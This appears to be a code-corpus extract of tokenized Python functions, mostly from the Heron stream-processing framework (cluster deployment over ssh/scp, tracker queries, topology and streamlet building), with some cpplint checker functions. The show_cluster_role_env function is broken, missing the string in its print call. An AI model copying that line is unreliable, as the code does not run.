def print_cluster_info ( cl_args ) : parsed_roles = read_and_parse_roles ( cl_args ) masters = list ( parsed_roles [ Role . MASTERS ] ) slaves = list ( parsed_roles [ Role . SLAVES ] ) zookeepers = list ( parsed_roles [ Role . ZOOKEEPERS ] ) cluster = list ( parsed_roles [ Role . CLUSTER ] ) # OrderedDicts are used here so that the key order can be # specified directly info = OrderedDict ( ) info [ 'numNodes' ] = len ( cluster ) info [ 'nodes' ] = cluster roles = OrderedDict ( ) roles [ 'masters' ] = masters roles [ 'slaves' ] = slaves roles [ 'zookeepers' ] = zookeepers urls = OrderedDict ( ) urls [ 'serviceUrl' ] = get_service_url ( cl_args ) urls [ 'heronUi' ] = get_heron_ui_url ( cl_args ) urls [ 'heronTracker' ] = get_heron_tracker_url ( cl_args ) info [ 'roles' ] = roles info [ 'urls' ] = urls print json . dumps ( info , indent = 2 )
def add_additional_args ( parsers ) : for parser in parsers : cli_args . add_verbose ( parser ) cli_args . add_config ( parser ) parser . add_argument ( '--heron-dir' , default = config . get_heron_dir ( ) , help = 'Path to Heron home directory' )
def start_cluster ( cl_args ) : roles = read_and_parse_roles ( cl_args ) masters = roles [ Role . MASTERS ] slaves = roles [ Role . SLAVES ] zookeepers = roles [ Role . ZOOKEEPERS ] Log . info ( "Roles:" ) Log . info ( " - Master Servers: %s" % list ( masters ) ) Log . info ( " - Slave Servers: %s" % list ( slaves ) ) Log . info ( " - Zookeeper Servers: %s" % list ( zookeepers ) ) if not masters : Log . error ( "No master servers specified!" ) sys . exit ( - 1 ) if not slaves : Log . error ( "No slave servers specified!" ) sys . exit ( - 1 ) if not zookeepers : Log . error ( "No zookeeper servers specified!" ) sys . exit ( - 1 ) # make sure configs are templated update_config_files ( cl_args ) dist_nodes = list ( masters . union ( slaves ) ) # if just local deployment if not ( len ( dist_nodes ) == 1 and is_self ( dist_nodes [ 0 ] ) ) : distribute_package ( roles , cl_args ) start_master_nodes ( masters , cl_args ) start_slave_nodes ( slaves , cl_args ) start_api_server ( masters , cl_args ) start_heron_tools ( masters , cl_args ) Log . info ( "Heron standalone cluster complete!" )
def start_heron_tools ( masters , cl_args ) : single_master = list ( masters ) [ 0 ] wait_for_master_to_start ( single_master ) cmd = "%s run %s >> /tmp/heron_tools_start.log 2>&1 &" % ( get_nomad_path ( cl_args ) , get_heron_tools_job_file ( cl_args ) ) Log . info ( "Starting Heron Tools on %s" % single_master ) if not is_self ( single_master ) : cmd = ssh_remote_execute ( cmd , single_master , cl_args ) Log . debug ( cmd ) pid = subprocess . Popen ( cmd , shell = True , stdout = subprocess . PIPE , stderr = subprocess . PIPE ) return_code = pid . wait ( ) output = pid . communicate ( ) Log . debug ( "return code: %s output: %s" % ( return_code , output ) ) if return_code != 0 : Log . error ( "Failed to start Heron Tools on %s with error:\n%s" % ( single_master , output [ 1 ] ) ) sys . exit ( - 1 ) wait_for_job_to_start ( single_master , "heron-tools" ) Log . info ( "Done starting Heron Tools" )
def distribute_package ( roles , cl_args ) : Log . info ( "Distributing heron package to nodes (this might take a while)..." ) masters = roles [ Role . MASTERS ] slaves = roles [ Role . SLAVES ] tar_file = tempfile . NamedTemporaryFile ( suffix = ".tmp" ) . name Log . debug ( "TAR file %s to %s" % ( cl_args [ "heron_dir" ] , tar_file ) ) make_tarfile ( tar_file , cl_args [ "heron_dir" ] ) dist_nodes = masters . union ( slaves ) scp_package ( tar_file , dist_nodes , cl_args )
def wait_for_master_to_start ( single_master ) : i = 0 while True : try : r = requests . get ( "http://%s:4646/v1/status/leader" % single_master ) if r . status_code == 200 : break except : Log . debug ( sys . exc_info ( ) [ 0 ] ) Log . info ( "Waiting for cluster to come up... %s" % i ) time . sleep ( 1 ) if i > 10 : Log . error ( "Failed to start Nomad Cluster!" ) sys . exit ( - 1 ) i = i + 1
def wait_for_job_to_start ( single_master , job ) : i = 0 while True : try : r = requests . get ( "http://%s:4646/v1/job/%s" % ( single_master , job ) ) if r . status_code == 200 and r . json ( ) [ "Status" ] == "running" : break else : raise RuntimeError ( ) except : Log . debug ( sys . exc_info ( ) [ 0 ] ) Log . info ( "Waiting for %s to come up... %s" % ( job , i ) ) time . sleep ( 1 ) if i > 20 : Log . error ( "Failed to start Nomad Cluster!" ) sys . exit ( - 1 ) i = i + 1
def scp_package ( package_file , destinations , cl_args ) : pids = [ ] for dest in destinations : if is_self ( dest ) : continue Log . info ( "Server: %s" % dest ) file_path = "/tmp/heron.tar.gz" dest_file_path = "%s:%s" % ( dest , file_path ) remote_cmd = "rm -rf ~/.heron && mkdir ~/.heron " "&& tar -xzvf %s -C ~/.heron --strip-components 1" % ( file_path ) cmd = '%s && %s' % ( scp_cmd ( package_file , dest_file_path , cl_args ) , ssh_remote_execute ( remote_cmd , dest , cl_args ) ) Log . debug ( cmd ) pid = subprocess . Popen ( cmd , shell = True , stdout = subprocess . PIPE , stderr = subprocess . PIPE ) pids . append ( { "pid" : pid , "dest" : dest } ) errors = [ ] for entry in pids : pid = entry [ "pid" ] return_code = pid . wait ( ) output = pid . communicate ( ) Log . debug ( "return code: %s output: %s" % ( return_code , output ) ) if return_code != 0 : errors . append ( "Failed to scp package to %s with error:\n%s" % ( entry [ "dest" ] , output [ 1 ] ) ) if errors : for error in errors : Log . error ( error ) sys . exit ( - 1 ) Log . info ( "Done distributing packages" )
def read_and_parse_roles ( cl_args ) : roles = dict ( ) with open ( get_inventory_file ( cl_args ) , 'r' ) as stream : try : roles = yaml . load ( stream ) except yaml . YAMLError as exc : Log . error ( "Error parsing inventory file: %s" % exc ) sys . exit ( - 1 ) if Role . ZOOKEEPERS not in roles or not roles [ Role . ZOOKEEPERS ] : Log . error ( "Zookeeper servers node defined!" ) sys . exit ( - 1 ) if Role . CLUSTER not in roles or not roles [ Role . CLUSTER ] : Log . error ( "Heron cluster nodes defined!" ) sys . exit ( - 1 ) # Set roles roles [ Role . MASTERS ] = set ( [ roles [ Role . CLUSTER ] [ 0 ] ] ) roles [ Role . SLAVES ] = set ( roles [ Role . CLUSTER ] ) roles [ Role . ZOOKEEPERS ] = set ( roles [ Role . ZOOKEEPERS ] ) roles [ Role . CLUSTER ] = set ( roles [ Role . CLUSTER ] ) return roles
def get_remote_home ( host , cl_args ) : cmd = "echo ~" if not is_self ( host ) : cmd = ssh_remote_execute ( cmd , host , cl_args ) pid = subprocess . Popen ( cmd , shell = True , stdout = subprocess . PIPE , stderr = subprocess . PIPE ) return_code = pid . wait ( ) output = pid . communicate ( ) if return_code != 0 : Log . error ( "Failed to get home path for remote host %s with output:\n%s" % ( host , output ) ) sys . exit ( - 1 ) return output [ 0 ] . strip ( "\n" )
def get_hostname ( ip_addr , cl_args ) : if is_self ( ip_addr ) : return get_self_hostname ( ) cmd = "hostname" ssh_cmd = ssh_remote_execute ( cmd , ip_addr , cl_args ) pid = subprocess . Popen ( ssh_cmd , shell = True , stdout = subprocess . PIPE , stderr = subprocess . PIPE ) return_code = pid . wait ( ) output = pid . communicate ( ) if return_code != 0 : Log . error ( "Failed to get hostname for remote host %s with output:\n%s" % ( ip_addr , output ) ) sys . exit ( - 1 ) return output [ 0 ] . strip ( "\n" )
def is_self ( addr ) : ips = [ ] for i in netifaces . interfaces ( ) : entry = netifaces . ifaddresses ( i ) if netifaces . AF_INET in entry : for ipv4 in entry [ netifaces . AF_INET ] : if "addr" in ipv4 : ips . append ( ipv4 [ "addr" ] ) return addr in ips or addr == get_self_hostname ( )
def to_table ( result ) : max_count = 20 table , count = [ ] , 0 for role , envs_topos in result . items ( ) : for env , topos in envs_topos . items ( ) : for topo in topos : count += 1 if count > max_count : continue else : table . append ( [ role , env , topo ] ) header = [ 'role' , 'env' , 'topology' ] rest_count = 0 if count <= max_count else count - max_count return table , header , rest_count
def show_cluster ( cl_args , cluster ) : try : result = tracker_access . get_cluster_topologies ( cluster ) if not result : Log . error ( 'No topologies in cluster \'%s\'' % cluster ) return False result = result [ cluster ] except Exception : Log . error ( "Fail to connect to tracker: \'%s\'" , cl_args [ "tracker_url" ] ) return False table , header , rest_count = to_table ( result ) print ( 'Topologies running in cluster \'%s\'' % cluster ) if rest_count : print ( '  with %d more...' % rest_count ) print ( tabulate ( table , headers = header ) ) return True
def show_cluster_role ( cl_args , cluster , role ) : try : result = tracker_access . get_cluster_role_topologies ( cluster , role ) if not result : Log . error ( 'Unknown cluster/role \'%s\'' % '/' . join ( [ cluster , role ] ) ) return False result = result [ cluster ] except Exception : Log . error ( "Fail to connect to tracker: \'%s\'" , cl_args [ "tracker_url" ] ) return False table , header , rest_count = to_table ( result ) print ( 'Topologies running in cluster \'%s\' submitted by \'%s\':' % ( cluster , role ) ) if rest_count : print ( '  with %d more...' % rest_count ) print ( tabulate ( table , headers = header ) ) return True
def show_cluster_role_env ( cl_args , cluster , role , env ) : try : result = tracker_access . get_cluster_role_env_topologies ( cluster , role , env ) if not result : Log . error ( 'Unknown cluster/role/env \'%s\'' % '/' . join ( [ cluster , role , env ] ) ) return False result = result [ cluster ] except Exception : Log . error ( "Fail to connect to tracker: \'%s\'" , cl_args [ "tracker_url" ] ) return False table , header , rest_count = to_table ( result ) print ( % ( cluster , role , env ) ) if rest_count : print ( '  with %d more...' % rest_count ) print ( tabulate ( table , headers = header ) ) return True
def pick_unused_port ( self ) : s = socket . socket ( socket . AF_INET , socket . SOCK_STREAM ) s . bind ( ( '127.0.0.1' , 0 ) ) _ , port = s . getsockname ( ) s . close ( ) return port
def get_pplan ( self , topologyName , callback = None ) : if callback : self . pplan_watchers [ topologyName ] . append ( callback ) else : pplan_path = self . get_pplan_path ( topologyName ) with open ( pplan_path ) as f : data = f . read ( ) pplan = PhysicalPlan ( ) pplan . ParseFromString ( data ) return pplan
def create_socket_options ( ) : sys_config = system_config . get_sys_config ( ) opt_list = [ const . INSTANCE_NETWORK_WRITE_BATCH_SIZE_BYTES , const . INSTANCE_NETWORK_WRITE_BATCH_TIME_MS , const . INSTANCE_NETWORK_READ_BATCH_SIZE_BYTES , const . INSTANCE_NETWORK_READ_BATCH_TIME_MS , const . INSTANCE_NETWORK_OPTIONS_SOCKET_RECEIVED_BUFFER_SIZE_BYTES , const . INSTANCE_NETWORK_OPTIONS_SOCKET_SEND_BUFFER_SIZE_BYTES ] Log . debug ( "In create_socket_options()" ) try : value_lst = [ int ( sys_config [ opt ] ) for opt in opt_list ] sock_opt = SocketOptions ( * value_lst ) return sock_opt except ValueError as e : # couldn't convert to int raise ValueError ( "Invalid value in sys_config: %s" % str ( e ) ) except KeyError as e : # option key was not found raise KeyError ( "Incomplete sys_config: %s" % str ( e ) )
def class_dict_to_specs ( mcs , class_dict ) : specs = { } for name , spec in class_dict . items ( ) : if isinstance ( spec , HeronComponentSpec ) : # Use the variable name as the specification name. if spec . name is None : spec . name = name if spec . name in specs : raise ValueError ( "Duplicate component name: %s" % spec . name ) else : specs [ spec . name ] = spec return specs
def init_topology ( mcs , classname , class_dict ) : if classname == 'Topology' : # Base class can't initialize protobuf return heron_options = TopologyType . get_heron_options_from_env ( ) initial_state = heron_options . get ( "cmdline.topology.initial.state" , "RUNNING" ) tmp_directory = heron_options . get ( "cmdline.topologydefn.tmpdirectory" ) if tmp_directory is None : raise RuntimeError ( "Topology definition temp directory not specified" ) topology_name = heron_options . get ( "cmdline.topology.name" , classname ) topology_id = topology_name + str ( uuid . uuid4 ( ) ) # create protobuf topology = topology_pb2 . Topology ( ) topology . id = topology_id topology . name = topology_name topology . state = topology_pb2 . TopologyState . Value ( initial_state ) topology . topology_config . CopyFrom ( TopologyType . get_topology_config_protobuf ( class_dict ) ) TopologyType . add_bolts_and_spouts ( topology , class_dict ) class_dict [ 'topology_name' ] = topology_name class_dict [ 'topology_id' ] = topology_id class_dict [ 'protobuf_topology' ] = topology class_dict [ 'topologydefn_tmpdir' ] = tmp_directory class_dict [ 'heron_runtime_options' ] = heron_options
def add_spout ( self , name , spout_cls , par , config = None , optional_outputs = None ) : spout_spec = spout_cls . spec ( name = name , par = par , config = config , optional_outputs = optional_outputs ) self . add_spec ( spout_spec ) return spout_spec
def add_bolt ( self , name , bolt_cls , par , inputs , config = None , optional_outputs = None ) : bolt_spec = bolt_cls . spec ( name = name , par = par , inputs = inputs , config = config , optional_outputs = optional_outputs ) self . add_spec ( bolt_spec ) return bolt_spec
def build_and_submit ( self ) : class_dict = self . _construct_topo_class_dict ( ) topo_cls = TopologyType ( self . topology_name , ( Topology , ) , class_dict ) topo_cls . write ( )
def queries_map ( ) : qs = _all_metric_queries ( ) return dict ( zip ( qs [ 0 ] , qs [ 1 ] ) + zip ( qs [ 2 ] , qs [ 3 ] ) )
def get_clusters ( ) : instance = tornado . ioloop . IOLoop . instance ( ) # pylint: disable=unnecessary-lambda try : return instance . run_sync ( lambda : API . get_clusters ( ) ) except Exception : Log . debug ( traceback . format_exc ( ) ) raise
def get_logical_plan ( cluster , env , topology , role ) : instance = tornado . ioloop . IOLoop . instance ( ) try : return instance . run_sync ( lambda : API . get_logical_plan ( cluster , env , topology , role ) ) except Exception : Log . debug ( traceback . format_exc ( ) ) raise
def get_topology_info ( * args ) : instance = tornado . ioloop . IOLoop . instance ( ) try : return instance . run_sync ( lambda : API . get_topology_info ( * args ) ) except Exception : Log . debug ( traceback . format_exc ( ) ) raise
def get_component_metrics ( component , cluster , env , topology , role ) : all_queries = metric_queries ( ) try : result = get_topology_metrics ( cluster , env , topology , component , [ ] , all_queries , [ 0 , - 1 ] , role ) return result [ "metrics" ] except Exception : Log . debug ( traceback . format_exc ( ) ) raise
def _get_spout ( self ) : spout = topology_pb2 . Spout ( ) spout . comp . CopyFrom ( self . _get_base_component ( ) ) # Add output streams self . _add_out_streams ( spout ) return spout
def _get_bolt ( self ) : bolt = topology_pb2 . Bolt ( ) bolt . comp . CopyFrom ( self . _get_base_component ( ) ) # Add streams self . _add_in_streams ( bolt ) self . _add_out_streams ( bolt ) return bolt
def _get_base_component ( self ) : comp = topology_pb2 . Component ( ) comp . name = self . name comp . spec = topology_pb2 . ComponentObjectSpec . Value ( "PYTHON_CLASS_NAME" ) comp . class_name = self . python_class_path comp . config . CopyFrom ( self . _get_comp_config ( ) ) return comp
def _add_in_streams ( self , bolt ) : if self . inputs is None : return # sanitize inputs and get a map <GlobalStreamId -> Grouping> input_dict = self . _sanitize_inputs ( ) for global_streamid , gtype in input_dict . items ( ) : in_stream = bolt . inputs . add ( ) in_stream . stream . CopyFrom ( self . _get_stream_id ( global_streamid . component_id , global_streamid . stream_id ) ) if isinstance ( gtype , Grouping . FIELDS ) : # it's a field grouping in_stream . gtype = gtype . gtype in_stream . grouping_fields . CopyFrom ( self . _get_stream_schema ( gtype . fields ) ) elif isinstance ( gtype , Grouping . CUSTOM ) : # it's a custom grouping in_stream . gtype = gtype . gtype in_stream . custom_grouping_object = gtype . python_serialized in_stream . type = topology_pb2 . CustomGroupingObjectType . Value ( "PYTHON_OBJECT" ) else : in_stream . gtype = gtype
def _add_out_streams ( self , spbl ) : if self . outputs is None : return # sanitize outputs and get a map <stream_id -> out fields> output_map = self . _sanitize_outputs ( ) for stream_id , out_fields in output_map . items ( ) : out_stream = spbl . outputs . add ( ) out_stream . stream . CopyFrom ( self . _get_stream_id ( self . name , stream_id ) ) out_stream . schema . CopyFrom ( self . _get_stream_schema ( out_fields ) )
def get_out_streamids ( self ) : if self . outputs is None : return set ( ) if not isinstance ( self . outputs , ( list , tuple ) ) : raise TypeError ( "Argument to outputs must be either list or tuple, given: %s" % str ( type ( self . outputs ) ) ) ret_lst = [ ] for output in self . outputs : if not isinstance ( output , ( str , Stream ) ) : raise TypeError ( "Outputs must be a list of strings or Streams, given: %s" % str ( output ) ) ret_lst . append ( Stream . DEFAULT_STREAM_ID if isinstance ( output , str ) else output . stream_id ) return set ( ret_lst )
def _get_stream_id ( comp_name , stream_id ) : proto_stream_id = topology_pb2 . StreamId ( ) proto_stream_id . id = stream_id proto_stream_id . component_name = comp_name return proto_stream_id
def _get_stream_schema ( fields ) : stream_schema = topology_pb2 . StreamSchema ( ) for field in fields : key = stream_schema . keys . add ( ) key . key = field key . type = topology_pb2 . Type . Value ( "OBJECT" ) return stream_schema
def register_metric ( self , name , metric , time_bucket_in_sec ) : collector = self . get_metrics_collector ( ) collector . register_metric ( name , metric , time_bucket_in_sec )
def get_component_tasks ( self , component_id ) : ret = [ ] for task_id , comp_id in self . task_to_component_map . items ( ) : if comp_id == component_id : ret . append ( task_id ) return ret
def get_metrics_collector ( self ) : if self . metrics_collector is None or not isinstance ( self . metrics_collector , MetricsCollector ) : raise RuntimeError ( "Metrics collector is not registered in this context" ) return self . metrics_collector
def setup ( self , context ) : myindex = context . get_partition_index ( ) self . _files_to_consume = self . _files [ myindex : : context . get_num_partitions ( ) ] self . logger . info ( "TextFileSpout files to consume %s" % self . _files_to_consume ) self . _lines_to_consume = self . _get_next_lines ( ) self . _emit_count = 0
def add_verbose ( parser ) : parser . add_argument ( '--verbose' , metavar = '(a boolean; default: "false")' , type = bool , default = False ) return parser
def add_tracker_url ( parser ) : parser . add_argument ( '--tracker_url' , metavar = '(tracker url; default: "' + DEFAULT_TRACKER_URL + '")' , type = str , default = DEFAULT_TRACKER_URL ) return parser
def hex_escape ( bin_str ) : printable = string . ascii_letters + string . digits + string . punctuation + ' ' return '' . join ( ch if ch in printable else r'0x{0:02x}' . format ( ord ( ch ) ) for ch in bin_str )
def _handle_assignment_message ( self , pplan ) : Log . debug ( "In handle_assignment_message() of STStmgrClient, Physical Plan: \n%s" , str ( pplan ) ) self . heron_instance_cls . handle_assignment_msg ( pplan )
def send ( self , dispatcher ) : if self . sent_complete : return sent = dispatcher . send ( self . to_send ) self . to_send = self . to_send [ sent : ]
def read ( self , dispatcher ) : try : if not self . is_header_read : # try reading header to_read = HeronProtocol . HEADER_SIZE - len ( self . header ) self . header += dispatcher . recv ( to_read ) if len ( self . header ) == HeronProtocol . HEADER_SIZE : self . is_header_read = True else : Log . debug ( "Header read incomplete; read %d bytes of header" % len ( self . header ) ) return if self . is_header_read and not self . is_complete : # try reading data to_read = self . get_datasize ( ) - len ( self . data ) self . data += dispatcher . recv ( to_read ) if len ( self . data ) == self . get_datasize ( ) : self . is_complete = True except socket . error as e : if e . errno == socket . errno . EAGAIN or e . errno == socket . errno . EWOULDBLOCK : # Try again later -> call continue_read later Log . debug ( "Try again error" ) else : # Fatal error Log . debug ( "Fatal error when reading IncomingPacket" ) raise RuntimeError ( "Fatal error occured in IncomingPacket.read()" )
def generate ( ) : data_bytes = bytearray ( random . getrandbits ( 8 ) for i in range ( REQID . REQID_SIZE ) ) return REQID ( data_bytes )
def yaml_config_reader ( config_path ) : if not config_path . endswith ( ".yaml" ) : raise ValueError ( "Config file not yaml" ) with open ( config_path , 'r' ) as f : config = yaml . load ( f ) return config
def send_buffered_messages ( self ) : while not self . out_stream . is_empty ( ) and self . _stmgr_client . is_registered : tuple_set = self . out_stream . poll ( ) if isinstance ( tuple_set , tuple_pb2 . HeronTupleSet ) : tuple_set . src_task_id = self . my_pplan_helper . my_task_id self . gateway_metrics . update_sent_packet ( tuple_set . ByteSize ( ) ) self . _stmgr_client . send_message ( tuple_set )
def _handle_state_change_msg ( self , new_helper ) : assert self . my_pplan_helper is not None assert self . my_instance is not None and self . my_instance . py_class is not None if self . my_pplan_helper . get_topology_state ( ) != new_helper . get_topology_state ( ) : # handle state change # update the pplan_helper self . my_pplan_helper = new_helper if new_helper . is_topology_running ( ) : if not self . is_instance_started : self . start_instance_if_possible ( ) self . my_instance . py_class . invoke_activate ( ) elif new_helper . is_topology_paused ( ) : self . my_instance . py_class . invoke_deactivate ( ) else : raise RuntimeError ( "Unexpected TopologyState update: %s" % new_helper . get_topology_state ( ) ) else : Log . info ( "Topology state remains the same." )
def get_topology_config ( self ) : if self . pplan . topology . HasField ( "topology_config" ) : return self . _get_dict_from_config ( self . pplan . topology . topology_config ) else : return { }
def set_topology_context ( self , metrics_collector ) : Log . debug ( "Setting topology context" ) cluster_config = self . get_topology_config ( ) cluster_config . update ( self . _get_dict_from_config ( self . my_component . config ) ) task_to_component_map = self . _get_task_to_comp_map ( ) self . context = TopologyContextImpl ( cluster_config , self . pplan . topology , task_to_component_map , self . my_task_id , metrics_collector , self . topology_pex_abs_path )
def _setup_custom_grouping ( self , topology ) : for i in range ( len ( topology . bolts ) ) : for in_stream in topology . bolts [ i ] . inputs : if in_stream . stream . component_name == self . my_component_name and in_stream . gtype == topology_pb2 . Grouping . Value ( "CUSTOM" ) : # this bolt takes my output in custom grouping manner if in_stream . type == topology_pb2 . CustomGroupingObjectType . Value ( "PYTHON_OBJECT" ) : custom_grouping_obj = default_serializer . deserialize ( in_stream . custom_grouping_object ) if isinstance ( custom_grouping_obj , str ) : pex_loader . load_pex ( self . topology_pex_abs_path ) grouping_cls = pex_loader . import_and_get_class ( self . topology_pex_abs_path , custom_grouping_obj ) custom_grouping_obj = grouping_cls ( ) assert isinstance ( custom_grouping_obj , ICustomGrouping ) self . custom_grouper . add ( in_stream . stream . id , self . _get_taskids_for_component ( topology . bolts [ i ] . comp . name ) , custom_grouping_obj , self . my_component_name ) elif in_stream . type == topology_pb2 . CustomGroupingObjectType . Value ( "JAVA_OBJECT" ) : raise NotImplementedError ( "Java-serialized custom grouping is not yet supported " "for python topology" ) else : raise ValueError ( "Unrecognized custom grouping type found: %s" % str ( in_stream . type ) )
def prepare ( self , context ) : for stream_id , targets in self . targets . items ( ) : for target in targets : target . prepare ( context , stream_id )
def choose_tasks ( self , stream_id , values ) : if stream_id not in self . targets : return [ ] ret = [ ] for target in self . targets [ stream_id ] : ret . extend ( target . choose_tasks ( values ) ) return ret
def format_mode ( sres ) : mode = sres . st_mode root = ( mode & 0o700 ) >> 6 group = ( mode & 0o070 ) >> 3 user = ( mode & 0o7 ) def stat_type ( md ) : ''' stat type''' if stat . S_ISDIR ( md ) : return 'd' elif stat . S_ISSOCK ( md ) : return 's' else : return '-' def triple ( md ) : ''' triple ''' return '%c%c%c' % ( 'r' if md & 0b100 else '-' , 'w' if md & 0b010 else '-' , 'x' if md & 0b001 else '-' ) return '' . join ( [ stat_type ( mode ) , triple ( root ) , triple ( group ) , triple ( user ) ] )
def format_mtime ( mtime ) : now = datetime . now ( ) dt = datetime . fromtimestamp ( mtime ) return '%s %2d %5s' % ( dt . strftime ( '%b' ) , dt . day , dt . year if dt . year != now . year else dt . strftime ( '%H:%M' ) )
def read_chunk ( filename , offset = - 1 , length = - 1 , escape_data = False ) : try : length = int ( length ) offset = int ( offset ) except ValueError : return { } if not os . path . isfile ( filename ) : return { } try : fstat = os . stat ( filename ) except Exception : return { } if offset == - 1 : offset = fstat . st_size if length == - 1 : length = fstat . st_size - offset with open ( filename , "r" ) as fp : fp . seek ( offset ) try : data = fp . read ( length ) except IOError : return { } if data : data = _escape_data ( data ) if escape_data else data return dict ( offset = offset , length = len ( data ) , data = data ) return dict ( offset = offset , length = 0 )
def str_cmd ( cmd , cwd , env ) : process = subprocess . Popen ( cmd , stdout = subprocess . PIPE , stderr = subprocess . PIPE , cwd = cwd , env = env ) stdout_builder , stderr_builder = proc . async_stdout_stderr_builder ( process ) process . wait ( ) stdout , stderr = stdout_builder . result ( ) , stderr_builder . result ( ) return { 'command' : ' ' . join ( cmd ) , 'stderr' : stderr , 'stdout' : stdout }
def to_table ( metrics ) : all_queries = tracker_access . metric_queries ( ) m = tracker_access . queries_map ( ) names = metrics . values ( ) [ 0 ] . keys ( ) stats = [ ] for n in names : info = [ n ] for field in all_queries : try : info . append ( str ( metrics [ field ] [ n ] ) ) except KeyError : pass stats . append ( info ) header = [ 'container id' ] + [ m [ k ] for k in all_queries if k in metrics . keys ( ) ] return stats , header
def Match ( pattern , s ) : # The regexp compilation caching is inlined in both Match and Search for # performance reasons; factoring it out into a separate function turns out # to be noticeably expensive. if pattern not in _regexp_compile_cache : _regexp_compile_cache [ pattern ] = sre_compile . compile ( pattern ) return _regexp_compile_cache [ pattern ] . match ( s )
def Search ( pattern , s ) : if pattern not in _regexp_compile_cache : _regexp_compile_cache [ pattern ] = sre_compile . compile ( pattern ) return _regexp_compile_cache [ pattern ] . search ( s )
def FindNextMultiLineCommentStart ( lines , lineix ) : while lineix < len ( lines ) : if lines [ lineix ] . strip ( ) . startswith ( '/*' ) : # Only return this marker if the comment goes beyond this line if lines [ lineix ] . strip ( ) . find ( '*/' , 2 ) < 0 : return lineix lineix += 1 return len ( lines )
def FindNextMultiLineCommentEnd ( lines , lineix ) : while lineix < len ( lines ) : if lines [ lineix ] . strip ( ) . endswith ( '*/' ) : return lineix lineix += 1 return len ( lines )
def RemoveMultiLineCommentsFromRange ( lines , begin , end ) : # Having // dummy comments makes the lines non-empty, so we will not get # unnecessary blank line warnings later in the code. for i in range ( begin , end ) : lines [ i ] = '/**/'
def CheckForCopyright ( filename , lines , error ) : # We'll say it should occur by line 10. Don't forget there's a # dummy line at the front. for line in range ( 1 , min ( len ( lines ) , 11 ) ) : if re . search ( r'Copyright' , lines [ line ] , re . I ) : break else : # means no copyright line was found error ( filename , 0 , 'legal/copyright' , 5 , 'No copyright message found.  ' 'You should have a line: "Copyright [year] <Copyright Owner>"' )
def CheckHeaderFileIncluded ( filename , include_state , error ) : # Do not check test files fileinfo = FileInfo ( filename ) if Search ( _TEST_FILE_SUFFIX , fileinfo . BaseName ( ) ) : return for ext in GetHeaderExtensions ( ) : basefilename = filename [ 0 : len ( filename ) - len ( fileinfo . Extension ( ) ) ] headerfile = basefilename + '.' + ext if not os . path . exists ( headerfile ) : continue headername = FileInfo ( headerfile ) . RepositoryName ( ) first_include = None for section_list in include_state . include_list : for f in section_list : if headername in f [ 0 ] or f [ 0 ] in headername : return if not first_include : first_include = f [ 1 ] error ( filename , first_include , 'build/include' , 5 , '%s should include its header file %s' % ( fileinfo . RepositoryName ( ) , headername ) )
def SetVerboseLevel ( self , level ) : last_verbose_level = self . verbose_level self . verbose_level = level return last_verbose_level
def AddFilters ( self , filters ) : for filt in filters . split ( ',' ) : clean_filt = filt . strip ( ) if clean_filt : self . filters . append ( clean_filt ) for filt in self . filters : if not ( filt . startswith ( '+' ) or filt . startswith ( '-' ) ) : raise ValueError ( 'Every filter in --filters must start with + or -' ' (%s does not)' % filt )
def IncrementErrorCount ( self , category ) : self . error_count += 1 if self . counting in ( 'toplevel' , 'detailed' ) : if self . counting != 'detailed' : category = category . split ( '/' ) [ 0 ] if category not in self . errors_by_category : self . errors_by_category [ category ] = 0 self . errors_by_category [ category ] += 1
def PrintErrorCounts ( self ) : for category , count in sorted ( iteritems ( self . errors_by_category ) ) : self . PrintInfo ( 'Category \'%s\' errors found: %d\n' % ( category , count ) ) if self . error_count > 0 : self . PrintInfo ( 'Total errors found: %d\n' % self . error_count )
def CheckEnd ( self , filename , clean_lines , linenum , error ) : line = clean_lines . raw_lines [ linenum ] # Check how many lines is enclosed in this namespace.  Don't issue # warning for missing namespace comments if there aren't enough # lines.  However, do apply checks if there is already an end of # namespace comment and it's incorrect. # # TODO(unknown): We always want to check end of namespace comments # if a namespace is large, but sometimes we also want to apply the # check if a short namespace contained nontrivial things (something # other than forward declarations).  There is currently no logic on # deciding what these nontrivial things are, so this check is # triggered by namespace size only, which works most of the time. if ( linenum - self . starting_linenum < 10 and not Match ( r'^\s*};*\s*(//|/\*).*\bnamespace\b' , line ) ) : return # Look for matching comment at end of namespace. # # Note that we accept C style "/* */" comments for terminating # namespaces, so that code that terminate namespaces inside # preprocessor macros can be cpplint clean. # # We also accept stuff like "// end of namespace <name>." with the # period at the end. # # Besides these, we don't accept anything else, otherwise we might # get false negatives when existing comment is a substring of the # expected namespace. if self . name : # Named namespace if not Match ( ( r'^\s*};*\s*(//|/\*).*\bnamespace\s+' + re . escape ( self . name ) + r'[\*/\.\\\s]*$' ) , line ) : error ( filename , linenum , 'readability/namespace' , 5 , 'Namespace should be terminated with "// namespace %s"' % self . name ) else : # Anonymous namespace if not Match ( r'^\s*};*\s*(//|/\*).*\bnamespace[\*/\.\\\s]*$' , line ) : # If "// namespace anonymous" or "// anonymous namespace (more text)", # mention "// anonymous namespace" as an acceptable form if Match ( r'^\s*}.*\b(namespace anonymous|anonymous namespace)\b' , line ) : error ( filename , linenum , 'readability/namespace' , 5 , 'Anonymous namespace should be terminated with "// namespace"' ' or "// anonymous namespace"' ) else : error ( filename , linenum , 'readability/namespace' , 5 , 'Anonymous namespace should be terminated with "// namespace"' )
def map ( self , map_function ) : from heronpy . streamlet . impl . mapbolt import MapStreamlet map_streamlet = MapStreamlet ( map_function , self ) self . _add_child ( map_streamlet ) return map_streamlet
def filter ( self , filter_function ) : from heronpy . streamlet . impl . filterbolt import FilterStreamlet filter_streamlet = FilterStreamlet ( filter_function , self ) self . _add_child ( filter_streamlet ) return filter_streamlet
def union ( self , other_streamlet ) : from heronpy . streamlet . impl . unionbolt import UnionStreamlet union_streamlet = UnionStreamlet ( self , other_streamlet ) self . _add_child ( union_streamlet ) other_streamlet . _add_child ( union_streamlet ) return union_streamlet
def log ( self ) : from heronpy . streamlet . impl . logbolt import LogStreamlet log_streamlet = LogStreamlet ( self ) self . _add_child ( log_streamlet ) return
def consume ( self , consume_function ) : from heronpy . streamlet . impl . consumebolt import ConsumeStreamlet consume_streamlet = ConsumeStreamlet ( consume_function , self ) self . _add_child ( consume_streamlet ) return
def join ( self , join_streamlet , window_config , join_function ) : from heronpy . streamlet . impl . joinbolt import JoinStreamlet , JoinBolt join_streamlet_result = JoinStreamlet ( JoinBolt . INNER , window_config , join_function , self , join_streamlet ) self . _add_child ( join_streamlet_result ) join_streamlet . _add_child ( join_streamlet_result ) return join_streamlet_result
